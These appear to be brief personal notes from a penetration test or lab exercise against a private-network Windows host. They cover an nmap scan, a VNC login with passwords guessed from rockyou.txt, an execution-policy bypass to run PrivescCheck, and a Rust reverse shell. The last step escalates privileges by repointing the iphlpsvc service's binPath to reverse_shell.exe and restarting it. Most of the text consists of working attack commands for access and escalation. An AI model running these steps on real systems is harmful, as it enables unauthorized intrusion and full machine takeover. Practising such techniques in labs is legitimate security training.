url=192.168.1.101

nmap

vnc port 5900
password is rockyou (manually testing rockyou.txt)
same for user is iloveyou

[PrivescCheck](https://github.com/itm4n/PrivescCheck)

file transfer over updog

```sh
Set-ExecutionPolicy Bypass -Scope Process -Force
. .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format HTML
```

rev shell from `git@github.com:Erez-Goldberg/Rust-revshell.git`, easy for cross compiling

file transfer over updog

```sh
sc.exe config iphlpsvc binPath= "C:\Users\Jenny\Downloads\reverse_shell.exe"
sc.exe stop iphlpsvc
sc.exe start iphlpsvc
```

